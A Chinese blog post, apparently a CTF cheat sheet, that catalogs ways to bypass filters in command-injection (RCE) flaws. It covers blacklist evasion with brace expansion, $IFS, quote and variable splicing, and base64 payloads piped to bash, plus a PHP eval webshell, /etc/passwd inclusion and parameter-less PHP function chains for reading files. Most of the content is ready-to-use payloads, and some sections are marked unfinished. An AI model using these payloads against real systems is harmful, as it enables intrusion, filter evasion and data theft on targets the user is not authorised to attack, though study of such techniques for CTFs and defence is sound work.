---
title: RCE Bypass
date: {{ date }}
top: false
cover: false
password:
toc: true
mathjax: true
summary:
tags: RCE
categories: RCE
---

# RCE Bypass

参考[RCE漏洞之绕过](https://blog.csdn.net/loseheart157/article/details/109305380)

## - 花括号

`{}`

在linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令

`{cat,flag}`

## - 反斜杠

路径`/`

反斜杠`\`是在正则等语法里面，表示后面跟的字符是正常字符，不需要转义。

也就意味着，我们可以在rce漏洞，过滤掉`cat`、`ls`等命令时，使用`ca\t`来实现绕过

## - 空格过滤

**注意:**在使用带有`$`的内容替换时，要注意用`\`转义，因为`$`在php中有特殊含义

```
< 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等
```

## - 一些命令分隔符

linux中：`%0a`（回车）、`%0d`（换行）、`;`、`&`、`|`、`&&`、`||`

windows中：`%0a`、`&`、`|`、`%1a`（一个神奇的角色，作为**.bat**文件中的命令分隔符）

## - 黑名单绕过

### -- 变量拼接绕过

例如：

```shell
a=l;b=s;$a$b
```

利用偶读拼接方法绕过黑名单：

```shell
a=fl;b=ag;cat $a$b
```

利用.拼接绕过`(sy.(st).em)`

使用内敛执行代替system

```php
echo `ls`;
echo $(ls);
?><?=`ls`;
?><?=$(ls);
<?=`ls /`;?>   #等效于<?php echo `ls /`;?>
```

### -- 编码绕过

```
echo "Y2F0IGZsYWc="|base64 -d|bash
-d是解码，是base64解码

xxd - r -p可以转换16进制，同样用户管道符之后。
```

### -- 单引号和双引号绕过

```shell
比如ca''t flag或cat""t flag
```

### -- 利用shell特殊变量绕过

使用`$*`和`$@`，`$x`(x代表1-9)，`${x}`(x>=10)。

PS：因为在没有传参的情况下，上面的特殊变量都是为空的

比如`ca$@t fla$@g`或者`ca$1t fla$2g`

### -- linux中直接查看文件内容的工具

```
 cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev、cut、awk
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
```

假设该目录下有index.php和flag.php

```shell
cat `ls`
```

等同于

```shell
cat flag.php;cat index.php
```

cat新姿势/bin/?at

### -- 文件构造

在ctfhub文件包含中，有一个shell,txt,也就是文件
我们令?file = shell.txt，已知shell.txt内容为

<?php eval($_REQUEST['ctfhub']);?>

request类型是由get和post构成的
在post数据里输入
ctfhub=system("ls /");
就可以执行命令.



## -- 无需括号的函数

~~~php
```php
<?php
echo 666;
print 666;
die;
include "/etc/passwd";
require "/etc/passwd";
include_once "/etc/passwd";
require_once "/etc/passwd";
~~~

## -- 过滤单引号和双引号

$_GET[1]

$_POST[a]

此处为何参数不需要单引号或双引号也能用，不太清楚，但的确能用。

## -- 无参数文件读取

> 参考
>
> https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/

### 思路

1. 利用超全局变量进行bypass,进行RCE
2. 进行任意文件读取

### 法一：localeconv()

- highlight_file()

  ![image-20210518200944707](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518200944707.png)

- 此函数用来获取`.`，在windows及linux中均表示当前目录

  localeconv()函数返回包含本地数字及货币格式信息的数组

  ![image-20210518174614995](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518174614995.png)

- scandir()函数用来列出指定路径中的文件和目录

  ![image-20210518165817130](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518165817130.png)

- current()函数返回数组中的当前元素(单元)，默认取第一个值

- pos()同current()，是current()的别名

- reset()函数返回数组第一个单元的值，如果数组为空则返回FALSE

  构造如下：

  ```php
  print_r(scandir(current(localeconv())));
  print_r(scandir(pos(localeconv())));
  print_r(scandir(reset(localeconv())));
  ```

### 法二（待完善）:getenv()

**注意**：貌似只有php7.1.0才行，在docker中试了一下php5.6，提示getenv()需要提供参数![image-20210518190014039](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518190014039.png)![image-20210518185825681](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518185825681.png)

php常见超全局变量

```php
$GLOBALS
$_SERVER
$_GET
$_POST
$_FILES
$_COOKIE
$_SESSION
$_REQUEST
$_ENV
```

这里可以使用`$_ENV`，对应函数为`getenv()`

![image-20210518162644882](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518162644882.png)

但如何从数组中取出指定值，这里可以使用方法：![image-20210518162756460](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518162756460.png)

结合array_rand()、array_flip()及getenv()，我们可以用爆破的方式获取数组中任意位置需要的值，可获取指定位置的恶意参数。

### 法三：getallheaders()

**限制**：getallheaders()为apache函数，目标中间件必须为apache。

![image-20210518192151719](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518192151719.png)

返回值

```php
array(13) { 
	["Cookie"]=> string(36) "PHPSESSID=58o6f1g08ot3drhnbs0m22i1hv" 
	["Accept-Language"]=> string(14) "en-US,en;q=0.9" 
	["Accept-Encoding"]=> string(17) "gzip, deflate, br" 
	["Sec-Fetch-Dest"]=> string(8) "document" 
	["Sec-Fetch-Mode"]=> string(8) "navigate" 
	["Sec-Fetch-Site"]=> string(10) "cross-site" 
	["Accept"]=> string(135) "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
	["User-Agent"]=> string(115) "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" 
	["Upgrade-Insecure-Requests"]=> string(1) "1" 
	["Sec-Ch-Ua-Mobile"]=> string(2) "?0" 
	["Sec-Ch-Ua"]=> string(64) "" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"" 
	["Connection"]=> string(5) "close" 
	["Host"]=> string(9) "127.0.0.1" 
}
```

通过修改request包，进行简单爆破就能获取指定位置的恶意参数

![image-20210518200344715](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210518200344715.png)

### 法四：get_defined_vars()

利用get_defined_vars()使用范围更广一些。

查看回显

![image-20210518203122147](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203122147.png)

发现其可以回显全局变量

```php
$_GET
$_POST
$_FILES
$_COOKIE
```

这里的选择也就具有多样性，可以利用`$_GET`进行RCE，如下![image-20210518203341256](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203341256.png)

将其参数取出

![image-20210518203719246](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203719246.png)

可以成功RCE

# 异或 取反 自增 按位或 按位与

先记录这么个思路，待实践。

